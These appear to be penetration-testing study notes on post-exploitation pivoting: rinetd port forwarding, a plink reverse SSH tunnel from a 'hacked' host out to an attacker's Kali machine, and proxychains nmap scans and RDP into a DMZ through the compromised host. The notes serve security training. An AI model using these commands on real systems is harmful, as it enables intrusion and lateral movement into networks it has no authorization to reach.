# post exploitation tools
### Port Forwarding and Redirection
Scenario: Client (RDP) --> Remote server. won't be able to connect due to egress restrictions in the network.
Solution: Use a proxy machine (Linux), and `rinetd` service to allow port forwarding.
- Proxy
  - `rinetd service` (port forwarding utility)
    - Proxy: 208.88.127.99 (public ip)
    - Client: not importand
    - Server: 67.23.72.109 (destination server with RDP enabled)
- edit `/etc/rinetd.conf`
```
# bindadress    bindport  connectaddress  connectport
208.88.127.99   80        67.23.72.109    3389
```
- restart the service: `/etc/init.d/rinetd restart`
- now within the client machine, open the RDP client and use the proxy machine's ip with port 80
  - `208.88.127.99:80`

## SSH tunneling and Proxies
Connecting local port to a remote port via ssh tunnel.
Tunneling a remote port to a local server.

### plink (ssh remote port forwarding)
Allowes us to tunnel a `remote port` to a `local server`.
- uploading `plink.exe` to the remote (hacked) machine
- checking that RDP is running on the machine `netstat -na | find "LISTEN"` (look for port `3389`)
- we wish to access the RDP port on this `internal non routable machine`
- we'll `tunnel out` the RDP port from this machine to our kali machine.
- execute on the victim machine `plink -l root -pw rootpassword 208.88.127.99 -R 3390:127.0.0.1:3389`
  - `plink -l kali-user -pw kali-password kali-machine-ip -R new-tunneled-port:127.0.0.1:port-to-expose-out`
  - `-R` remote tunnel, 
  - `127.0.0.1:3389`, traffic from local port 3389 will be tunneled out
- once executed, an SSH tunnel/connection will be made. do NOT use that terminal for anything. keep it open and don't touch it.
- on kali machine, `netstat -na | grep LISTEN`. you'll see that port 3390 is LISTENing to incoming requests.
- on kali machine, open a new terminal. execute the following: `rdesktop 127.0.0.1:3390` which will get tunneled to our victim machine.

### ssh (dynamic port forwarding)
- remote compromised host: 172.16.40.10
- local socks4 proxy (kali machine), listening on port 8080. `netstat -antp | grep 8080`
We'll tunnel and redirect traffic from our attacking (kali) machine to the non-routable DMZ network.

#### ProxyChains (forward and tunnel traffic)
- kali linux
  - `/etc/proxychains.conf`
```
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4 	127.0.0.1 9050
socks4 	127.0.0.1 8080
```
  - use proxychain to route nmap scan on the destination network via the hacked machine.
    - `proxychains nmap -p 3389 -sT -Pn 172.16.40.18-22 --open`
  - once we find an instance (machine) on the DMZ network (example: host with RDP enabled). We can use proxychains to chain the RDP request from our kali machine.
    - `proxychains rdesktop 172.16.40.20`
